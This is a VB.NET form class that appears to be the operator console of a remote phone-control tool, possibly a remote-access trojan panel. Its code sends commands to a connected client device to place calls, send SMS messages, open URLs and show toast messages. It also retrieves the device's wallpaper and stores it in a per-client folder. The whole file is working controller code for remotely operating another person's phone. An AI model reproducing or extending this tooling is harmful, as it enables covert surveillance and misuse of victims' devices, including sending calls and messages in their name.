﻿Public Class Phone
    Public handle_Number_Client As Integer
    Public Client_remote_Address As String
    Public Name_Client As String
    Public Client_ID As String

    Private int% = 0


    Sub Client_data(ByVal data As String)
        Try
            If data IsNot Nothing Then
                If Not data = "opWind" Then



                    If data.Contains("[My/Exception]") And data.StartsWith("[My/Exception]") Then
                        Dim spl_Exception() As String = {"[My/Exception]"}
                        Dim p() As String = data.Split(spl_Exception, StringSplitOptions.RemoveEmptyEntries)
                        Label3.Text = p(0)
                        If Panel3.Visible = False Then Panel3.Visible = True
                    Else


                        'DataGridView1.Rows.Clear()
                        Dim split_Ary() As String = {Form1.s.split_Ary}
                        Dim Ary() As String = data.Split(split_Ary, StringSplitOptions.RemoveEmptyEntries)
                        Select Case Ary(0)
                            Case "phone_call"
                                Label2.Text = Ary(1)
                            Case "phone_send"
                                Label2.Text = Ary(1)
                            Case "uri_send"
                                Label2.Text = Ary(1)
                            Case "toast_text"
                                Label2.Text = Ary(1)
                            Case "wallpaper"
                                Dim Converts() As Byte = Convert.FromBase64String(Ary(1))
                                Dim ms As New IO.MemoryStream(Converts)
                                Dim base64 As New Bitmap(Image.FromStream(ms))
                                PictureBox1.Image = base64
                                ms.Dispose()

                                Dim f As String = Application.StartupPath & "\" & store_0.name_folder_app_resource & "\Folder_Clients\" & Name_Client & Client_ID & "\" & "wallpaper"
                                If Not My.Computer.FileSystem.DirectoryExists(f) Then My.Computer.FileSystem.CreateDirectory(f)
                                Dim Dat_2 As String = DateTime.Now.ToString("yyyy-MM-dd-HH.mm.ss")
                                Dim NAM_2 As String = String.Format("{0:1}", Dat_2, Nothing)
                                base64.Save(f + "\" + NAM_2 + ".Jpeg", System.Drawing.Imaging.ImageFormat.Jpeg)


                        End Select


                        If Panel3.Visible = True Then Panel3.Visible = False


                    End If

                End If

            End If
        Catch ex As Exception

            'MsgBox(ex.ToString)
        End Try
    End Sub


    Private Sub Phone_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        RichTextBox1.ContextMenuStrip = store_0.ContextMenu1
        RichTextBox2.ContextMenuStrip = store_0.ContextMenu1
        ErrorProvider1.Icon = store_0.icons_0("errors")
        refres_title()
        Me.Icon = store_0.icons_0("window")
        TabPage1.Text = "Contact phone numbers"
        TabPage2.Text = "Send SMS"
        TabPage3.Text = "Wallpaper"
        TabPage4.Text = "URI"
        TabPage5.Text = "Toast"
        TabPage1.Select()
        DataGridView1.Rows.Add("1", "2", "3")
        DataGridView1.Rows.Add("4", "5", "6")
        DataGridView1.Rows.Add("7", "8", "9")
        DataGridView1.Rows.Add("*", "0", "#")
    End Sub
    Private Sub TabPage1_Enter(ByVal sender As Object, ByVal e As System.EventArgs) Handles TabPage1.Enter
        int = 1
        Button1.Text = "Call"

        Panel1.Enabled = True
    End Sub
    Private Sub TabPage2_Enter(ByVal sender As Object, ByVal e As System.EventArgs) Handles TabPage2.Enter
        int = 2
        Button1.Text = "Send"

        Panel1.Enabled = True
    End Sub

    Private Sub TabPage3_Enter(ByVal sender As Object, ByVal e As System.EventArgs) Handles TabPage3.Enter
        int = 3
        Button1.Text = "Get"

        Panel1.Enabled = False
    End Sub
    Private Sub TabPage4_Enter(ByVal sender As Object, ByVal e As System.EventArgs) Handles TabPage4.Enter
        int = 4
        Button1.Text = "Open"

        Panel1.Enabled = False
    End Sub
    Private Sub TabPage5_Enter(ByVal sender As Object, ByVal e As System.EventArgs) Handles TabPage5.Enter
        int = 5
        Button1.Text = "Show"

        Panel1.Enabled = False
    End Sub
    Private Sub refres_title()
        Dim title As String = String.Format("Phone" + " - Remote Address & Port: {0} Client Name: {1}", Client_remote_Address, Name_Client)
        Text = title
    End Sub
    Function Parse_0(ByVal strValue As String) As String
        Dim f$ = Nothing
        For Each c As Char In strValue.ToCharArray()
            Dim s$ = CStr(c).Trim
            If s = "#" Or s = "*" Or s = "+" Or IsNumeric(s) = True Then
                f = f + s
            End If
        Next c
        Return f
    End Function
    Private Sub DataGridView1_CellContentClick_1(sender As Object, e As DataGridViewCellEventArgs) Handles DataGridView1.CellContentClick
        TextBox1.Text += DataGridView1.CurrentCell.Value.ToString
    End Sub
    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        If Not TextBox1.Text.Length = 0 Then
            TextBox1.Text = TextBox1.Text.Remove(TextBox1.Text.Length - 1)
        End If
    End Sub
    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Dim strnumber As String = Parse_0(TextBox1.Text)
        TextBox1.Text = strnumber

        Select Case int
                Case 1

                'call
                If Not strnumber = Nothing Then
                    Form1.s.Send(handle_Number_Client, "phone_call" + Form1.s.SplitData + strnumber)
                    Me.ErrorProvider1.SetError(TextBox1, Nothing)
                Else
                    Me.ErrorProvider1.SetError(TextBox1, "Cannot be Empty")
                End If

            Case 2
                'send sms
                If Not strnumber = Nothing Then
                    Dim strText As String = RichTextBox1.Text
                    Form1.s.Send(handle_Number_Client, "phone_send" + Form1.s.SplitData + strnumber + Form1.s.SplitData + strText)
                    Me.ErrorProvider1.SetError(TextBox1, Nothing)
                Else
                    Me.ErrorProvider1.SetError(TextBox1, "Cannot be Empty")
                End If

            Case 3
                If Not PictureBox1.Image Is Nothing Then
                    PictureBox1.Image = Nothing
                End If
                'get wallpaper
                Form1.s.Send(handle_Number_Client, "get_wallpaper" + Form1.s.SplitData)
            Case 4
                'uri
                If Not TextBox2.Text = Nothing Then
                    If TextBox2.Text.Contains("http:") Or TextBox2.Text.Contains("https:") Then
                        Form1.s.Send(handle_Number_Client, "set_uri" + Form1.s.SplitData + TextBox2.Text)
                        Me.ErrorProvider1.SetError(TextBox2, Nothing)
                    Else
                        Me.ErrorProvider1.SetError(TextBox2, "missing 'http:' ? 'https:'")
                    End If
                Else
                    Me.ErrorProvider1.SetError(TextBox2, "Cannot be Empty")
                End If

            Case 5
                'Toast
                Form1.s.Send(handle_Number_Client, "toast_text" + Form1.s.SplitData + RichTextBox2.Text)
        End Select
        'send Client 

    End Sub

    Private Sub Phone_Resize(sender As Object, e As EventArgs) Handles Me.Resize
        ErrorProvider1.Clear()
    End Sub
End Class